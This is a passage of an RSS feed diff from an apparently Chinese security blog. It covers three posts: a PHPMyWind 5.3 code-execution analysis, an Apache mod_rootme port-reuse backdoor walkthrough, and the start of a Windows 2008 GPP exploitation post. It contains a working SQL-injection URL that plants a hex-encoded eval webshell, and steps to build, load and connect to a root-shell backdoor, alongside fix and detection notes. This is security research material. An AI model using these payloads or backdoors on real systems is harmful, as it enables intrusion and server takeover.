+						&lt;span class=&quot;nt&quot;&gt;&amp;lt;li&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;&amp;lt;span&amp;gt;&lt;/span&gt;促销价&lt;span class=&quot;nt&quot;&gt;&amp;lt;/span&amp;gt;&amp;lt;strong&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;price&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'salesprice'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/strong&amp;gt;&lt;/span&gt;元 &lt;span class=&quot;nt&quot;&gt;&amp;lt;/li&amp;gt;&lt;/span&gt;
+						&lt;span class=&quot;nt&quot;&gt;&amp;lt;li&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;&amp;lt;span&amp;gt;&lt;/span&gt;浏览数&lt;span class=&quot;nt&quot;&gt;&amp;lt;/span&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'hits'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt; 次&lt;span class=&quot;nt&quot;&gt;&amp;lt;/li&amp;gt;&lt;/span&gt;
+						&lt;span class=&quot;nt&quot;&gt;&amp;lt;li&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;&amp;lt;span&amp;gt;&lt;/span&gt;配　送&lt;span class=&quot;nt&quot;&gt;&amp;lt;/span&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'payfreight'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'买家承担运费'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'商家承担运费'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/li&amp;gt;&lt;/span&gt;
+					&lt;span class=&quot;nt&quot;&gt;&amp;lt;/ul&amp;gt;&lt;/span&gt;
+					&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;tb-skin&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+						&lt;span class=&quot;nt&quot;&gt;&amp;lt;p&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;tb-note-title&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;span&amp;gt;&lt;/span&gt;请选择您要的商品信息&lt;span class=&quot;nt&quot;&gt;&amp;lt;/span&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;shoppingcart.php&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;end&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;结算购物车&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
+						&lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;gform&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;gform&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;post&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+							&lt;span class=&quot;nt&quot;&gt;&amp;lt;dl&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;tb-prop&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+							&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+
+							&lt;span class=&quot;c1&quot;&gt;//将商品属性id与值组成数组
+&lt;/span&gt;							&lt;span class=&quot;nv&quot;&gt;$rowattr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;String2Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'attrstr'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+							&lt;span class=&quot;nv&quot;&gt;$row2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$dosql&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'SELECT * FROM `#@__goodsattr` WHERE `goodsid`='&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'typeid'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; AND `checkinfo`=true&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+							&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dosql&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;GetTotalRow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+							&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+								&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+								&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$row2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$dosql&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;GetArray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
+								&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+							&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+								&lt;span class=&quot;nt&quot;&gt;&amp;lt;dt&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$row2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'attrname'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;：&lt;span class=&quot;nt&quot;&gt;&amp;lt;/dt&amp;gt;&lt;/span&gt;
+								&lt;span class=&quot;nt&quot;&gt;&amp;lt;dd&amp;gt;&lt;/span&gt;
+									&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+								&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$rowattr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$row2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'id'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]]))&lt;/span&gt;
+								&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+									&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&amp;lt;div id=&quot;attrdiv_'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$row2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'id'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'&quot;&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+									&lt;span class=&quot;nv&quot;&gt;$dfvalue&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+									&lt;span class=&quot;nv&quot;&gt;$rowattrs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;explode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'|'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$rowattr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$row2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'id'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]]);&lt;/span&gt;
+									&lt;span class=&quot;k&quot;&gt;foreach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$rowattrs&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$k&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+									&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+										&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&amp;lt;a href=&quot;javascript:;&quot; onclick=&quot;SelAttr(this,'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$row2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'id'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;',\''&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$v&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'\');&quot;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+										&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+										&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+											&lt;span class=&quot;nv&quot;&gt;$dfvalue&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+											&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'class=&quot;selected&quot;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+										&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+										&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&amp;gt;'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$v&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'&amp;lt;/a&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+									&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+									&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&amp;lt;input type=&quot;hidden&quot; name=&quot;attrid_'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$row2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'id'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'&quot; id=&quot;attrid_'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$row2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'id'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'&quot; value=&quot;'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dfvalue&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'&quot; /&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+									&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&amp;lt;/div&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+								&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+								&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+								&lt;span class=&quot;nt&quot;&gt;&amp;lt;/dd&amp;gt;&lt;/span&gt;
+								&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+									&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+								&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+							&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+							&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;我们重点关注一下String2Array函数，可以在\include\commnon.fun.php找到定义&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if(!function_exists('String2Array'))
+{
+	function String2Array($data)
+	{
+		if($data == '') return array();
+		@eval(&quot;\$array = $data;&quot;);
+		return $array;
+	}
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;很明显这会造成一个代码执行。我们再次回到上面的代码。&lt;code class=&quot;highlighter-rouge&quot;&gt;$rowattr = String2Array($row['attrstr']);&lt;/code&gt;其中&lt;code class=&quot;highlighter-rouge&quot;&gt;$row['attrstr']&lt;/code&gt;是通过&lt;code class=&quot;highlighter-rouge&quot;&gt;SELECT * FROM `#@__goods` WHERE id=$id&lt;/code&gt;这个语句获取的。如果我们能修改&lt;code class=&quot;highlighter-rouge&quot;&gt;#@__goods&lt;/code&gt;表里面的attrstr字段值的话，那就可以造成任意代码执行了。刚好可以配合前面的一个SQL注入。这样就能完美发挥这个漏洞了。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;0x02漏洞利用&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;由于在这个cms里面存在全局的GPC过滤，所以我们不能使用单引号。这样会转义。因此我们在update的时候可以用十六进制的方法。&lt;/p&gt;
+
+&lt;p&gt;第一步我们构造&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://127.0.0.1/PHPMyWind_5.3/4g.php?m=show&amp;amp;cid=2&amp;amp;tbname=pmw_goods`  SET attrstr=0x6576616c28245f504f53545b27746f6d61746f275d29 where classid=12  or @`'` %23 and @`'`
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;这个cms有80sec的防注入，所以我们要绕过这个防注入。网上有详细的文章，这里就不复述了。&lt;/p&gt;
+
+&lt;p&gt;然后可以看到数据库里&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-308065326.png&quot; alt=&quot;308065326&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;这里已经被成功update进去一个一句话木马了。&lt;/p&gt;
+
+&lt;p&gt;第二步
+访问
+http://127.0.0.1/PHPMyWind_5.3/goodsshow.php?cid=12&amp;amp;tid=10&amp;amp;id=1&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2215906991.png&quot; alt=&quot;2215906991&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;成功执行代码&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;0x03漏洞修复&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;初始化&lt;code class=&quot;highlighter-rouge&quot;&gt;$tanm&lt;/code&gt;,不使用eval函数&lt;/p&gt;
+
+</description>
+        <pubDate>Wed, 28 Oct 2015 00:00:00 +0800</pubDate>
+        <link>http://localhost:4000/vulnerability/analysis/2015/10/28/phpmywind-v5.3%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C.html</link>
+        <guid isPermaLink="true">http://localhost:4000/vulnerability/analysis/2015/10/28/phpmywind-v5.3%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C.html</guid>
+        
+        <category>vulnerability analysis</category>
+        
+        <category>0day</category>
+        
+        
+        <category>vulnerability</category>
+        
+        <category>analysis</category>
+        
+      </item>
+    
+      <item>
+        <title>Apache端口复用后门</title>
+        <description>&lt;p&gt;测试环境&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;CentOSx64 6.5
+Apache2.5
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;strong&gt;0x01 利用方式&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;先修改后门的里面的httpd22.h文件，不修改的话，在apache启动的时候会报错&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;将&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#define MODULE_MAGIC_COOKIE 0x41503230UL
+&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;改为&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#define MODULE_MAGIC_COOKIE 0x41503232UL
+&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;将&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#define MODULE_MAGIC_NUMBER_MAJOR 20020903
+&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;改为&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#define MODULE_MAGIC_NUMBER_MAJOR 20051115
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;然后保存。输入make linux进行编译&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-185317750.jpg&quot; alt=&quot;185317750&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;然后修改/etc/httpd/conf/httpd.conf&lt;/p&gt;
+
+&lt;p&gt;添加 LoadModule rootme22_module modules/mod_rootme22.so 加载这个模块。&lt;/p&gt;
+
+&lt;p&gt;然后启动apache&lt;/p&gt;
+
+&lt;p&gt;然后使用就可以连接80端口 nc ip 80 然后输入GET root&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-4195482967.jpg&quot; alt=&quot;4195482967&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;成功获取shell&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;0x02 检测方式&lt;/strong&gt;&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;1.通过ps -ef&lt;/td&gt;
+      &lt;td&gt;grep httpd 可以看到有root用户使用的httpd子进程&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-67507677.jpg&quot; alt=&quot;67507677&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;然后可以进一步去查看apache配置文件&lt;/p&gt;
+
+&lt;p&gt;2.通过&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ps -ef | grep http | head -n 1 | awk &lt;span class=&quot;s1&quot;&gt;'{system(&quot;ls -l /proc/&quot;$2&quot;/fd&quot;)}'&lt;/span&gt; | grep pipe | wc -l
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;正常情况下是64，加载了mod_rootme后是66&lt;/p&gt;
+
+&lt;p&gt;3.在web目录下写个phpinfo看是否加载了mod_rootme模块&lt;/p&gt;
+
+</description>
+        <pubDate>Thu, 10 Sep 2015 00:00:00 +0800</pubDate>
+        <link>http://localhost:4000/2015/09/10/Apache%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8%E5%90%8E%E9%97%A8.html</link>
+        <guid isPermaLink="true">http://localhost:4000/2015/09/10/Apache%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8%E5%90%8E%E9%97%A8.html</guid>
+        
+        <category>penetration</category>
+        
+        <category>backdoor</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>windows2008 GPP漏洞利用</title>
+        <description>&lt;p&gt;测试环境&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;windows7 普通域成员
+windows2008 域控
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;首先部署GPP，这里我部署的策略是给域成员都添加一个test用户，密码为test123
+![QQ截图20150815011901.png][1]&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-493775859.png&quot; alt=&quot;493775859&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;添加一个本地用户
+&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-3035697488.png&quot; alt=&quot;3035697488&quot; /&gt;
+然后来到组策略管理&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-1117809806.png&quot; alt=&quot;1117809806&quot; /&gt;
+将domain computers 添加到验证组策略对象&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2121700627.png&quot; alt=&quot;2121700627&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;然后到域成员win7这台机器上执行&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gpupdate &amp;amp;&amp;amp; net user
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-1994353166.png&quot; alt=&quot;1994353166&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;然后可以访问&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\\tomato-dc\SYSVOL\tomato.com\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;这个目录下面有个group.xml文件&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&amp;gt;&lt;/span&gt;
